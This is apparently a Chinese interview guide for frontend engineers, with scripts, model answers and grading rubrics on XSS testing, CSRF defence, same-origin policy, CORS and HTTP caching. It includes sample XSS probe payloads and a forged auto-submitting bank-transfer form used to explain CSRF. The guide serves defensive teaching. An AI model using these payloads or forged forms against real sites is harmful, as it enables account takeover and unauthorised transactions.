> 预期回答：有经验的候选人会提到：(1) 用 XSS 测试 payload 验证输入输出点——如 `<img src=x onerror=alert(1)>`、`<svg/onload=alert(1)>`、`javascript:alert(1)`，但真机测试时注意不要搞乱生产数据；(2) 浏览器的 Audits/Lighthouse 可以检测部分 CSP 缺失和已知的 XSS 漏洞模式；(3) 使用自动化安全扫描工具（如 OWASP ZAP、Burp Suite）对应用做黑盒扫描；(4) CSP report-only 模式——`Content-Security-Policy-Report-Only` 头只上报违规但不拦截，通过 `report-uri` 或 `report-to` 把违规报告发送到后端接口，分析一段时间的报告确认策略没误拦后才转为 enforce 模式。

#### 过渡语

> 面试官：XSS 说完了。和 XSS 经常被放在一起问的还有一个——CSRF，它们有什么本质区别？

### Q5：CSRF 攻击和防御（19-23 min）

#### 面试官话术

> 面试官：XSS 是利用了脚本注入，那 CSRF 呢？请你讲一下 CSRF 的攻击原理，它和 XSS 的本质区别在哪里？你在项目里是怎么做防御的？

#### 面试官内心 OS

CSRF 和 XSS 经常被一起问，但能把它们的本质区别讲清楚的候选人并不多——很多候选人会说"都是 Web 攻击"然后混在一起来讲防御。核心区分点：XSS 是在**目标页面内执行恶意脚本**，需要注入；CSRF 是利用**浏览器的自动带 Cookie 机制**，在**第三方页面**上发起请求，不需要注入。能用一句话讲清这个区别的，说明理解到位了。

考察防御措施时关注：(1) SameSite Cookie 应该是第一个提到的方案——这是现代浏览器原生的免费防御，不需要额外 Token；(2) CSRF Token 应该放在请求头而非 Cookie 中——如果放 Cookie 里攻击者也能自动带；(3) 知不知道 Origin/Referer 校验作为"无 Token 方案"的替代——对于不需要登录态的公开 API 可以靠这个。能讲清楚"每种方案的适用场景和局限性"比"罗列所有方案"重要得多。

#### 考点

- CSRF 攻击原理（与 XSS 的本质区别）
- 防御方案及其原理：SameSite Cookie、CSRF Token、Origin/Referer 校验
- 各方案的适用场景、局限性和组合使用
- CSRF Token 的生成、存储和传输机制

#### 预期回答

**初级**：CSRF = 跨站请求伪造，攻击者构造一个恶意页面，当已登录的用户访问时，以用户身份向目标网站发送请求（如转账、修改密码）。防御：加 Token、设置 Cookie SameSite。

**中级**：能讲清楚攻击原理和本质区别：

- **攻击原理**：用户在 A 网站（如银行）登录后，浏览器保存了 A 网站的 Cookie。此时用户访问了恶意网站 B，B 网站上的 JS 或自动提交的表单向 A 网站发起请求（如 `<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="100000"></form>` 并自动提交）。浏览器会自动携带 A 网站的 Cookie 一起发送——服务器认为是已登录用户的合法请求。

- **与 XSS 的本质区别**：XSS 需要在目标页面内**注入并执行脚本**——攻击发生在目标页面上；CSRF 不需要注入，攻击发生在**第三方页面**上——利用的是浏览器的自动带 Cookie 机制。XSS 防御的核心是"不让恶意脚本执行"，CSRF 防御的核心是"不让跨站请求被接受"。

- **三层防御方案**：

1. **SameSite Cookie**（第一道，最简单、零开发成本）：SameSite=Strict（所有跨站请求都不带 Cookie，最安全但用户体验差——从邮件点链接跳转到已登录的网站需要重新登录）；SameSite=Lax（Chrome 默认值，允许顶级导航的 GET 请求带 Cookie，如表单 GET/链接点击，但不允许 POST/iframe/img 等子请求带 Cookie）；SameSite=None（所有请求都带，必须同时设置 Secure=true 即仅 HTTPS）。实际推荐：关键会话 Cookie 设为 SameSite=Lax，已经是现代浏览器默认行为，轻松防住大部分 CSRF。

2. **CSRF Token**（第二道，传统方案）：服务器生成一个随机 Token（如 UUID），通过页面（隐藏表单字段或 meta 标签）传给前端；前端每次请求时将 Token 放在请求头（`X-CSRF-Token`）或请求体中；服务器验证 Token 是否匹配。关键原则：**Token 不能存在 Cookie 中**——因为 Cookie 会自动带，放 Cookie 里攻击者也能触发的请求也会带 Token，就失去意义了。

3. **Origin/Referer 校验**（第三道，兜底）：检查请求的 `Origin` 或 `Referer` 头是否来自合法的域名。Origin 头由浏览器自动设置（包含协议+域名+端口，不含路径），无法被 JS 伪造。Referer 可以被某些浏览器策略隐藏（Referrer-Policy）。局限：某些环境（如老浏览器、某些代理）可能不发送 Origin/Referer 头；对于同站但不同源的场景，需要维护一份合法域名的白名单。

**高级**：在中级基础上，能深入：

- **CSRF Token 的完整生命周期和安全性**：Token 应该是对每个会话（Session）生成一个，而不是每个请求生成新的——后者会破坏用户体验（如多标签页、后退/前进）。Token 应该存储在 localStorage/sessionStorage 中，由前端 JS 读取后添加到请求头——因为 localStorage 不受同源策略的跨站限制之外的第三方页面访问。这就是为什么 CSRF 防御可以和"不把 Token 放 Cookie"完美配合。但注意：如果应用本身有 XSS 漏洞，localStorage 也会被读取，此时攻击者可以读到 Token 并发起真正 CSRF 请求——所以 XSS 和 CSRF 防御是互补的，缺一不可。

- **各方案的适用场景和局限**：SameSite Cookie——简单但不能防"同站但恶意"的场景（如攻击者在同站的其他子域上传了恶意页面，SameSite 不会拦截）；CSRF Token——需要服务端配合，对纯静态页面不适用；Origin/Referer 校验——对 API 调用（非浏览器发起的请求）不适用，因为第三方工具可以伪造 Origin 头；双重提交 Cookie——利用"攻击者无法读取但可以写入 Cookie"的特性，但现代浏览器 SameSite 已经解决了大部分问题，这种方案用得少了。

- **无状态 CSRF Token（JWT 场景）**：CSRF Token 不需要存储在服务端（这样每个请求都要查数据库/Redis 做校验），可以用"加密方案"——服务端生成 Token = HMAC(sessionId, secret_key)，前端放在请求头，服务端每次验证 HMAC 是否合法即可，无需查存储。或者更现代的做法：严格使用 SameSite=Strict/Lax + 自定义请求头（`X-Requested-With: XMLHttpRequest`），因为自定义头会触发 CORS 预检请求，攻击者无法从跨站发带自定义头的请求（除非 CORS 配置失当）。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 知道 CSRF 是利用登录态发起的跨站请求，能说出 Token 和 SameSite 两种防御方式，但说不出和 XSS 的本质区别，对 SameSite 三个值的含义不清楚 |
| 中级 | 能清晰区分 CSRF 和 XSS 的本质区别（注入执行 vs 利用 Cookie 自动携带），能完整描述攻击流程和三种防御方案（SameSite/Token/Origin），知道 SameSite=Lax 是 Chrome 默认值，知道 CSRF Token 不能放在 Cookie 中而应该放请求头 |
| 高级 | 在中级基础上，能深入分析 Token 的完整生命周期（Session 级 vs 请求级、如何生成和存储、无状态 Token 的 JWT 场景），能对比各防御方案的适用场景和局限性（SameSite 不能防同站恶意、Token 需要服务端配合、Origin 可被非浏览器请求伪造），能给出一个实际项目的组合防御架构 |

#### 追问方向

**追问1**："SameSite 有三个值，各自什么含义？如果一个旧系统没有 CSRF Token，只靠 SameSite 够不够？"

> 预期回答：SameSite=Strict——所有跨站请求都不带 Cookie，即使是用户从邮件点链接跳转，到目标网站时 Cookie 也不带，需要重新登录。最安全但 UX 差。SameSite=Lax——Chrome 80+ 的默认值，顶级导航（top-level navigation）的 GET 请求带 Cookie，但 iframe/img/script/AJAX 等子资源请求和对跨站 POST 请求不带 Cookie。这是"最实用"的默认值——用户从别的网站链接点进来已经是登录状态，但 CSRF 攻击的 POST 请求不会带 Cookie。SameSite=None——所有请求都带 Cookie，必须同时设 `Secure=true`（仅 HTTPS），相当于零限制，适用于需要跨站携带 Cookie 的场景（如第三方登录 iframe）。SameSite=Lax 是浏览器免费给的防御，对大部分场景已经足够防 POST CSRF。但有一个盲区——GET 请求的 CSRF（如 `<a href="https://bank.com/delete_user">点击领奖</a>`）在 Lax 下仍然能带 Cookie，因为它是顶级导航的 GET。需要额外配合：(1) 关键操作只用 POST/PUT/DELETE，不允许 GET 做修改；(2) 加上 Origin/Referer 校验。另外，浏览器支持度方面，所有现代浏览器的近两年版本都支持 SameSite，但如果系统还需要支持 IE11（不支持 SameSite），Token 是必需的补充方案。

**追问2**："CSRF Token 放哪里？为什么不能放在 Cookie 里？你项目中具体怎么实现的？"

> 预期回答：Token 应该放在请求头（如 `X-CSRF-Token`）或 POST 请求体中（如隐藏 `<input type="hidden" name="csrf_token" value="...">`）。不能放在 Cookie 中的原因：CSRF 攻击的本质就是攻击者无法读取跨站 Cookie 但浏览器会自动发送它们。如果 Token 也以 Cookie 形式存在，那么攻击者发起的跨站请求也会自动携带 Token Cookie，Token 就失去意义了。实际项目中的实现：(1) 服务端用户登录后生成一个 CSRF Token（UUID 或 HMAC），通过页面的 `<meta name="csrf-token" content="abc123">` 输出到 HTML；(2) 前端全局拦截器（如 Axios interceptor）读取 meta 标签中的 Token 值，自动添加到请求头 `X-CSRF-Token: abc123`；(3) 服务端中间件对所有非 GET/HEAD/OPTIONS 请求校验请求头中的 Token 是否合法——不要求 Token 值存储在服务端（用 HMAC 方案），直接用密钥验证 HMAC 是否匹配即可。

**追问3**："如果攻击者通过 XSS 拿到了 Token，CSRF 防御还有用吗？这两个防御之间是什么关系？"

> 预期回答：没用——CSRF 防御的前提是"攻击者不知道 Token 的值"，只能靠浏览器自动带 Cookie。如果 XSS 成功，攻击者在目标页面上执行任意 JS，可以：(1) 读取 localStorage 中的 Token；(2) 直接读取页面中的 `<meta name="csrf-token">`；(3) 甚至不需要做 CSRF——直接在 XSS payload 中通过 `fetch('/api/transfer', {...})` 发起请求就行了，浏览器会自动带 Cookie，Token 也可以从 JS 读到。所以 XSS 和 CSRF 防御是**互补关系**——XSS 防御阻止攻击者把代码注入到页面中，CSRF 防御阻止攻击者从外部利用浏览器机制。严格的防御应该是"纵深防御"：XSS 防御（输出转义 + CSP + HttpOnly） + CSRF 防御（SameSite + Token + Origin），每一层都独立生效，任何一层被突破还有其他层兜底。

### Q6：同源策略和跨域（23-27 min）

#### 面试官话术

> 面试官：同源策略是浏览器安全的基石。请你说说什么是同源策略，它具体限制了什么？跨域有哪些解决方案？在项目中你用过哪些？

#### 面试官内心 OS

同源策略是浏览器安全模型的"根基"，但很多候选人只知道"协议+域名+端口三相同 = 同源"然后跳到 CORS，对同源策略限制了什么、为什么限制却说不清楚。核心信号：(1) 能不能说出同源策略**具体限制的三类交互**——DOM 访问限制、Cookie 和 Storage 隔离、AJAX 请求限制——这比只背"三相同"更有含金量；(2) CORS 部分能不能区分简单请求和预检请求的触发条件——这是区分"用过 CORS"和"理解 CORS"的标准；(3) 能不能从"为什么有些跨域限制可以绕开"讲到安全设计的"木桶原则"——比如 `<script>` 标签为什么不受同源限制？这是为了支持 CDN 加载 JS，同时也给 JSONP 和 XSS 提供了可能。能讲出这些 trade-off 的，说明有安全架构的系统思维。

如果候选人列出 JSONP/postMessage/WebSocket/代理等方案时，问一句"CORS 现在都那么成熟了，为什么还要知道 JSONP？"——看能不能说出 JSONP 的历史意义和在现代项目中的存留场景（老系统兼容）。

#### 考点

- 同源策略的定义和三类限制（DOM / Storage / AJAX）
- CORS 机制：简单请求 vs 预检请求
- 跨域解决方案全景：CORS、JSONP、postMessage、反向代理、WebSocket、document.domain
- 各方案的适用场景和局限性

#### 预期回答

**初级**：同源 = 协议 + 域名 + 端口都相同，三者中任何一个不同就是跨域。跨域用 CORS——服务器设置 `Access-Control-Allow-Origin` 响应头就行。JSONP 也能跨域但只支持 GET。

**中级**：能系统性地讲清楚三层限制和主流方案：

**同源策略的三类限制**：

1. **DOM 访问限制**：不同源的页面之间无法通过 JS 访问彼此的 DOM。例如一个 iframe 加载了不同源的页面，父页面无法用 `iframe.contentWindow.document` 读取 iframe 内容。这是为了防止恶意页面通过 iframe 加载银行网站然后读取表单内容。
2. **Cookie/Storage 隔离**：每个源有独立的 Cookie、localStorage、sessionStorage、IndexedDB。不同源的页面无法读取对方的存储。即使同一域名下，不同端口之间的 localStorage 也是隔离的。这是为了防止恶意网站通过存储读取其他网站的用户数据。
3. **AJAX 请求限制**：浏览器会拦截不同源的 AJAX 请求的响应。注意——请求实际上发送到了服务器（服务器正常处理了），但浏览器在收到响应后会检查 CORS 头，不满足就拒绝把响应交给前端 JS 读取。这是为了防止恶意网站的 JS 读取其他网站的敏感数据（如企业内部 API）。

**CORS（跨域资源共享）机制**：简单请求（同时满足：GET/HEAD/POST 之一、Content-Type 为 text/plain 或 multipart/form-data 或 application/x-www-form-urlencoded、无自定义请求头）直接发送跨域请求，浏览器自动带 `Origin` 头，服务器若允许则返回 `Access-Control-Allow-Origin` 头，浏览器校验通过后将响应交给 JS。预检请求（不满足简单请求条件的——如 `Content-Type: application/json`、自定义 `Authorization` 头、PUT/DELETE 方法），浏览器先发送 OPTIONS 请求询问服务器是否允许该跨域请求，服务器返回 `Access-Control-Allow-Methods`、`Access-Control-Allow-Headers` 等头，浏览器校验通过后才会发送真正的请求。预检请求可以被 `Access-Control-Max-Age` 缓存一段时间，避免每次都发 OPTIONS。

**跨域方案全景**：
- **CORS**（首选）：标准化方案，支持所有 HTTP 方法，浏览器原生支持。需要服务端配合。
- **JSONP**：利用 `<script>` 标签不受同源限制，服务器返回 `callback({data})` 格式的 JS 代码。局限：只支持 GET、错误处理困难、有安全风险（被 XSS 利用）。
- **postMessage**：HTML5 API，用于不同源窗口/iframe 之间的安全通信。`targetWindow.postMessage(data, targetOrigin)` 发送，接收方用 `window.addEventListener('message', callback)` 监听。特点是显式指定目标源，防止数据泄露给非预期源。
- **反向代理**（Nginx/DevServer proxy）：浏览器请求同源地址，代理服务器转发到真正的后端。本质上避开了跨域——浏览器始终觉得自己在和同源通信。前端开发中最常用的方案（Vite/Webpack devServer proxy）。
- **WebSocket**：WS/WSS 协议不受同源策略限制（握手阶段的 Origin 校验由服务端决定是否接受）。适用于实时双向通信（聊天、通知推送）。

**高级**：在中级基础上，能深入：

- **CORS 与 Cookie 的配合**：默认情况下，跨域请求不携带 Cookie。要携带：（1）前端设置 `XMLHttpRequest.withCredentials = true` 或 `fetch({ credentials: 'include' })`；（2）服务器返回 `Access-Control-Allow-Credentials: true`；（3）服务器必须返回具体的 `Access-Control-Allow-Origin`（不能用 `*`）。这是为了安全——不允许通配符 + 携带凭据的组合。

- **postMessage 的安全陷阱**：接收方必须校验 `event.origin`，不要处理来自非预期源的消息；发送方必须指定精确的 `targetOrigin`，不要用 `'*'` 通配——否则恶意 iframe 可以监听并接收数据。实际项目中的攻击场景：你的页面使用 postMessage 发送 token 到 iframe 内的第三方组件，但 iframe 实际上被广告注入替换了——`targetOrigin: '*'` 就让任何 iframe 都能收到 token。

- **same-origin policy 的"例外"和其原因**：`<script>`、`<img>`、`<link>`、`<iframe>` 等标签的 src 属性不受同源限制——这是 Web 从一开始就有的设计（跨站加载 JS 库、图片、CSS）。这个"例外"的代价是催生了 JSONP（善用）和 XSS（恶意利用）。`<form>` 的跨站提交也不受限制——这在 CSRF 攻击中被利用，所以现代浏览器的 SameSite Cookie 才应运而生。

- **`document.domain` 和子域通信**（已废除但需了解）：曾经可以设 `document.domain = 'example.com'` 让 a.example.com 和 b.example.com 可以互相访问 DOM 和 Cookie（即使端口不同）。Chrome 119+ 已废弃此特性，因为安全风险太大——任何子域都可以通过这个机制伪装成主域。替代方案：postMessage 或服务器端中转。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 知道同源 = 协议+域名+端口，跨域用 CORS（设置 Access-Control-Allow-Origin），知道 JSONP 也能跨域，但说不出简单请求和预检请求的区别 |
| 中级 | 能完整描述同源策略的三类限制（DOM/Storage/AJAX），能区分简单请求和预检请求的触发条件并能解释 OPTIONS 预检流程，能列出 4+ 种跨域方案并说出各自适用场景和局限，知道 CORS 携带 Cookie 的配置方法 |
| 高级 | 在中级基础上，能深入 CORS 安全设计（为什么不能同时用 `*` 和 credentials），能分析 postMessage 的安全陷阱（origin 校验），能从"同源策略为什么留下 script/img 等例外"的角度理解 Web 安全的历史 trade-off，了解 document.domain 的废弃原因和替代方案 |

#### 追问方向

**追问1**："预检请求什么时候触发？OPTIONS 请求带了什么信息？怎么避免每次都发 OPTIONS？"

> 预期回答：当跨域请求不是"简单请求"时触发预检。简单请求的条件（三条必须同时满足）：(1) 方法为 GET/HEAD/POST 之一；(2) 除了浏览器自动设置的头部（如 Connection、User-Agent）外，只允许 Accept、Accept-Language、Content-Language、Content-Type；(3) Content-Type 只能是 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded` 之一。实际开发中，设置了 `Authorization` 头、`Content-Type: application/json`、或用了 PUT/DELETE 方法，都会触发预检。OPTIONS 请求头包含：(1) `Origin`——请求来源；(2) `Access-Control-Request-Method`——实际请求的 HTTP 方法；(3) `Access-Control-Request-Headers`——实际请求要用的自定义头部。服务器返回：(1) `Access-Control-Allow-Origin`；(2) `Access-Control-Allow-Methods`；(3) `Access-Control-Allow-Headers`；(4) `Access-Control-Max-Age`——预检结果的缓存秒数（如 86400 即 24 小时），在缓存期内的同类型请求不需要再次预检。

**追问2**："JSONP 为什么能跨域？它安全吗？你现在还会用它吗？"

> 预期回答：JSONP 利用了 `<script>` 标签的 src 属性不受同源策略限制的特性——浏览器去跨域请求 script URL 时，服务器返回一段 JS 代码（如 `handleData({name: 'z'})`），这触发了页面中预先定义的 `handleData` 回调函数，数据就传进来了。本质上它不是在"发 AJAX 请求"，而是在"加载一个 JS 文件"。安全性问题：(1) JSONP 完全信任服务器返回的代码——如果服务器被黑，返回的是恶意代码也会被执行；(2) 没有错误处理机制——服务器挂了或返回异常 JS，只能靠超时判断；(3) CSRF 攻击向量——JSONP 接口只要知道 URL 就能触发，相当于一个开放的 GET 接口。现代项目中不建议新使用 JSONP——CORS 已经足够成熟，所有现代浏览器都支持。老项目中可能存在 JSONP，遇到时需要考虑迁移方案（CORS 替代或加 CSRF Token）。

**追问3**："你用过的开发代理（devServer proxy）是怎么实现跨域的？它和安全意义上的跨域有什么区别？"

> 预期回答：devServer proxy（如 Vite `server.proxy`、webpack `devServer.proxy`）的原理是在开发服务器上起一个中间层——前端页面请求 `localhost:3000/api/xxx`（同源），开发服务器收到后转发到 `https://api.example.com/api/xxx`（后端），接收后端响应后再返回给前端。本质上，从浏览器视角，请求始终是发给同源的 `localhost:3000`——根本没有跨域发生。和安全意义上的"跨域绕过"区别：代理是服务器端行为（请求在服务端发出，不受浏览器同源策略限制），CORS 是浏览器端行为（浏览器自己检查并放行）。代理方案在生产环境需要对应的 Nginx 配置——开发时的 proxy 配置不能直接搬到线上。生产环境通常用 Nginx 做反向代理：`location /api/ { proxy_pass https://backend.example.com/; }`，原理相同。

> 面试官：跨域这块掌握得不错。接下来我们聊一个跟性能和用户体验直接相关的领域——浏览器缓存。

## 五、第三阶段：浏览器缓存（27-37 min，2 题）

### Q7：强缓存 vs 协商缓存（27-32 min）

#### 面试官话术

> 面试官：浏览器缓存是怎么工作的？请讲一下强缓存和协商缓存的区别，以及各自的控制方式。你在项目里是怎么用的？

#### 面试官内心 OS

缓存是前端性能优化中最便宜、收益最大的手段之一。核心看三点：(1) 能不能讲清楚强缓存和协商缓存的完整决策流程——浏览器是先检查强缓存（Cache-Control/Expires），命中直接返回 200 (from disk/memory cache)，不命中才走协商缓存（Etag/Last-Modified），命中返回 304；(2) 知不知道 Etag 优先级高于 Last-Modified 的原因——这是判断候选人对"为什么"有探究欲的标准；(3) 能不能在实战层面讲出不同资源类型的差异化缓存策略——HTML no-cache、带 hash 的 JS/CSS 设 immutable、图片短期强缓存+协商兜底。如果候选人能指出"Cache-Control 同时存在多个值时浏器的解析顺序"（max-age > Expires），说明细节抠得深。

每个候选人都知道 Cache-Control 能控制缓存，但只有真的在实践中调过缓存问题的人才知道"HTML 不能强缓存"这种血泪教训。问一句"为什么 HTML 不设强缓存？"——如果候选人说"因为要保证用户第一时间看到新版本"，追问"那如果用户已经拿到了旧 HTML 会怎样？"——引出"旧 HTML 引用的 JS/CSS 文件名变了，但旧 HTML 还在缓存中 -> 白屏"的场景。

#### 考点

- 强缓存机制（Cache-Control / Expires）
- 协商缓存机制（ETag/If-None-Match / Last-Modified/If-Modified-Since）
- 浏览器缓存决策流程（完整流程图口述）
- 缓存相关状态码和请求/响应头
- 实际项目中的缓存策略分层

#### 预期回答

**初级**：强缓存是浏览器直接从本地缓存读取资源，不发请求到服务器，状态码 200 (from disk cache 或 from memory cache)。协商缓存是浏览器发请求到服务器，服务器判断资源有没有改变，没改变就返回 304 告诉浏览器继续用本地缓存。知道 Cache-Control 的 `max-age` 控制强缓存时间，Etag 控制协商缓存。

**中级**：能完整描述两级缓存的决策流程：

**浏览器缓存决策流程**（按优先级）：

1. **强缓存检查**：浏览器检查请求资源的缓存头——先看 `Cache-Control: max-age=N`（相对时间，HTTP1.1），如果没有再看 `Expires`（绝对时间，HTTP1.0）。如果缓存未过期，(1) 直接从内存缓存（memory cache）或磁盘缓存（disk cache）读取；(2) 返回 200 (from memory/disk cache)；(3) 不发送任何网络请求。如果缓存已过期或没有缓存，进入下一步。

2. **协商缓存检查**：浏览器向服务器发送条件请求——带 `If-None-Match`（Etag 值）或 `If-Modified-Since`（Last-Modified 时间）。服务器对比：(1) 如果资源未改变，返回 `304 Not Modified`（body 为空），浏览器从缓存中读取；(2) 如果资源已改变，返回 `200 OK` + 完整资源，同时更新缓存。

**关键 HTTP 头的对应关系**：

| 类型 | 响应头（服务器 -> 浏览器） | 请求头（浏览器 -> 服务器） |
|------|---------------------------|---------------------------|
| 强缓存 | `Cache-Control: max-age=31536000`、`Expires: Thu, 31 Dec 2037 23:59:59 GMT` | 无（强缓存命中时不发请求） |
| 协商缓存 | `ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"`、`Last-Modified: Thu, 01 Dec 2022 16:00:00 GMT` | `If-None-Match: "33a64df..."`、`If-Modified-Since: Thu, 01 Dec 2022 16:00:00 GMT` |

**Cache-Control 的核心指令**：
- `max-age=N`：资源在 N 秒内可以直接使用缓存（不发起请求），优先级高于 Expires
- `no-cache`：**不是"不缓存"**，而是"缓存但每次都要发条件请求去服务器验证（走协商缓存）"
- `no-store`：**真正的"不缓存"**——不存任何缓存，每次都重新请求
- `public`：可以被 CDN/代理服务器等任何节点缓存
- `private`：只能被浏览器缓存，CDN 和代理不缓存（适合用户私有数据）
- `immutable`：资源在过期前绝对不变，不要发条件请求验证（适合带 hash 的静态资源）

**高级**：在中级基础上，能深入：

- **ETag vs Last-Modified 优先级**：Etag 优先级更高——从 HTTP 规范到所有浏览器和 Nginx 实现都是。原因是：(1) Etag 精确到文件内容级别（通常是内容的 hash），Last-Modified 只精确到秒，同一秒内多次修改检测不到；(2) 有些文件定期重新生成但内容未变，Last-Modified 会误判为"已修改"，Etag（基于内容）则准确；(3) 负载均衡场景下，同一个文件在不同服务器上的 Last-Modified 可能差几毫秒，Etag 是文件 hash，跨服务器一致。所以服务器比对时，先对比 `If-None-Match`（如果有），匹配就直接 304；不匹配或没有 Etag 时才对比 `If-Modified-Since`。

- **`Cache-Control: immutable` 的意义和适用条件**：告诉浏览器"这个资源过期前绝对不变，哪怕用户按 F5 刷新也不要发条件请求验证"。普通刷新时（非强制刷新 Ctrl+F5），浏览器通常会对已过期的缓存资源发送条件请求（带 If-None-Match）验证，即使缓存还没过期，在刷新时也可能发送。immutable 则完全禁止这种行为——只要 max-age 未过期，任何形式的刷新都直接用缓存。适用条件：只适用于带内容 hash 的文件名（如 `app.a1b2c3d4.js`），因为文件名变了就是新资源——文件名不变内容就不变，这个假设必须百分百成立。

- **启发式缓存（Heuristic Caching）**：当响应头没有 `Cache-Control` 和 `Expires` 时，浏览器会使用启发式算法自己计算缓存时间——默认取 `Date` 头与 `Last-Modified` 头差值的 10%（如差值 10 天 => 缓存 1 天）。这是为什么有时候改了资源客户端没有立即拿到——因为浏览器自作主张缓存了。最佳实践：所有响应都应该显式设置 `Cache-Control`，不要让浏览器自己去猜。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 知道强缓存（不请求，200 from cache）和协商缓存（问服务器，304）的区别，知道 Cache-Control 的 max-age 和 no-cache，能说出 Etag 和 Last-Modified 两个协商缓存头 |
| 中级 | 能完整描述两级缓存决策流程（先强缓存 -> 过期后走协商缓存），能准确说出 Cache-Control 各指令（max-age/no-cache/no-store/public/private）的含义，能解释 Etag 优先级高于 Last-Modified 的原因（精确度/秒级限制/跨服务器一致性），知道 no-cache 和 no-store 的本质区别（前者还要验证，后者完全不存） |
| 高级 | 在中级基础上，能解释 immutable 的作用（禁止刷新时重新验证）和适用条件（必须带内容 hash），能解释启发式缓存的原理和风险，能从一个资源请求的完整流程（强缓存检查 -> 协商缓存 -> 200 -> 缓存写入 -> 下次请求的链条）画流程，了解 Service Worker 缓存与 HTTP 缓存的层级关系 |

#### 追问方向

**追问1**："ETag 和 Last-Modified 哪个优先级更高？为什么？在多服务器部署时应该注意什么？"

> 预期回答：Etag 优先级更高。原因：(1) Etag 精确到内容级别（hash），Last-Modified 只精确到秒——同一秒内多次修改检测不到；(2) 某些资源定期生成但内容不变，Last-Modified 始终在更新，导致缓存失效。多服务器部署（负载均衡）的注意事项：(1) 默认 Nginx 生成的 Etag 格式是 `"文件inode-文件大小-修改时间"`，不同服务器上 inode 一定不同，即使文件内容相同 Etag 也不一致——导致同一文件在一台服务器返回 200（Etag 改变），在另一台返回 304；(2) 解决方案：去掉 Etag 中的 inode 和 mtime，只保留文件大小（`etag off` 或自定义 Etag 格式）；或者直接用内容 hash 生成 Etag；或者干脆只依赖 Last-Modified（如果文件部署工具能保证修改时间一致的话）；更彻底的做法——使用带 hash 的文件名 + immutable，完全不用协商缓存。

**追问2**："`no-cache` 和 `no-store` 的区别？什么场景用哪个？"

> 预期回答：`no-cache` 的意思是"可以缓存，但每次使用前必须去服务器验证（走协商缓存）"，浏览器会发条件请求（带 If-None-Match/If-Modified-Since），服务器返回 304 后才使用缓存。`no-store` 的意思是"完全不缓存——不存储到任何缓存中，每次都重新请求"。使用场景：`no-cache` 适用于内容可能变化但需要验证的场景——如新闻详情页，用户刷新时用协商缓存避免重新下载，但也要保证看到最新内容。`no-store` 适用于绝对不能使用旧数据的场景——如银行交易记录、个人隐私数据。一个常见的误解：很多人以为 `no-cache` 就是"不缓存"，实际上它是"缓存但每次验证"——这是面试中容易踩的坑。

**追问3**："用户在浏览器按 F5 刷新和 Ctrl+F5 强制刷新，缓存的决策有什么不同？"

> 预期回答：普通刷新（F5/Ctrl+R）：浏览器会为所有资源发送请求，但带上条件请求头（If-None-Match/If-Modified-Since）——相当于跳过强缓存直接走协商缓存。如果服务器返回 304，仍然用缓存。除非设置了 `Cache-Control: immutable`，则普通刷新也直接用缓存。强制刷新（Ctrl+Shift+R/Ctrl+F5）：浏览器会为所有资源发送不带条件头的请求——相当于完全跳过缓存，每次都请求完整资源。请求头里会带 `Cache-Control: no-cache` 和 `Pragma: no-cache`，告诉中间代理和服务器不要返回缓存版本。所以排查缓存问题时，一定要先确认是普通刷新还是强制刷新——普通刷新返回 304 不是 bug。

### Q8：实际缓存策略设计（32-37 min）

#### 面试官话术

> 面试官：假设你负责一个新前端项目的部署架构设计，这个项目有 HTML、JS、CSS、图片、字体、API 接口。请你给每种资源设计缓存策略，并解释为什么这样设计。如果项目需要发版更新，怎么保证用户能第一时间拿到新版本？

#### 面试官内心 OS

这道题从"理论"跳到"工程实践"。答好这题需要：理解不同类型资源的内容变更频率、理解"缓存失效率"和"缓存粒度"的 trade-off、理解发版策略和缓存策略的联动关系。核心判断信号：(1) "HTML no-cache + JS/CSS 文件名 hash + immutable"这个组合是不是第一时间就说出来——这是业界最佳实践，能脱口而出的说明有过实际部署经验；(2) 知不知道"先部署静态资源再部署 HTML"的发布顺序——如果先部署 HTML，此时新 HTML 引用了新的 JS 文件名，但 CDN 上还没有这个文件，用户体验是 404 白屏；(3) 能不能解释"为什么 CSS 也算非覆盖式发布"——CSS 中引用的字体/图片文件如果也带 hash，CSS 本身也是带 hash 的，文件名变了就是新文件，不需要覆盖旧文件。

#### 考点

- 不同类型资源的差异化缓存策略设计
- 文件 hash（content hash）与缓存失效的配合
- 非覆盖式发布（non-overwriting deployment）策略
- 发版时缓存更新流程和回滚方案
- CDN 与浏览器缓存的层级关系

#### 预期回答

**初级**：JS/CSS 设缓存时间长一点（如 max-age=31536000 一年），HTML 设短一点或不缓存。能说出"文件名加 hash 可以防止缓存不更新"。

**中级**：能给出完整的策略表格并解释每项决策：

| 资源类型 | 缓存策略 | 关键配置 | 原因 |
|----------|----------|----------|------|
| **HTML** | 协商缓存（不强缓存） | `Cache-Control: no-cache` | 每次发版都要让用户拿到最新 HTML，因为它引用了新的 JS/CSS 文件名 |
| **JS / CSS** | 长期强缓存 | `Cache-Control: max-age=31536000, immutable` | 文件名包含内容 hash，内容变了文件名就变 -> 新资源，旧文件名永远不变 -> 可以永久缓存 |
| **图片 / 字体** | 短期强缓存 + 协商兜底 | `Cache-Control: max-age=86400` + Etag | 变化不频繁但不带 hash 时，短期强缓存减少请求，协商缓存兜底更新 |
| **API GET** | 不缓存或短缓存 | `Cache-Control: no-cache` 或 `max-age=10` | 数据必须实时或准实时 |
| **API POST/PUT/DELETE** | 不缓存 | `Cache-Control: no-store` | 写操作绝对不能缓存 |

关键设计说明：

- **HTML 不设强缓存**：因为发版后 JS/CSS 的文件名变了（新 hash），但用户浏览器缓存里的旧 HTML 仍在引用旧文件名——如果旧 HTML 被强缓存，用户访问时会请求已经不存在的旧 JS 文件，导致 404 白屏。`no-cache` 保证每次加载页面都先问服务器"HTML 有没有变"，服务器返回 304 就让浏览器用旧缓存（未发版时），返回 200 就加载新 HTML（发版后）。

- **JS/CSS 文件名 hash（content hash）**：Webpack/Vite 构建时根据文件内容生成 hash 值（如 `app.a1b2c3d4.js`），内容变了 hash 就变 -> 新文件名 -> 新资源 -> 不会受旧缓存影响。配合 `immutable` 告诉浏览器"过期前绝对不变，别问服务器，直接用缓存"，最大限度减少请求数。

- **图片/字体如果没有 hash**：设短期强缓存（如 1 天）减少重复请求，同时配合 Etag 做协商缓存兜底——1 天后浏览器会发条件请求，如果图片没改就 304。如果文件名也带 hash，那就和 JS/CSS 一样设 `max-age=31536000, immutable`。

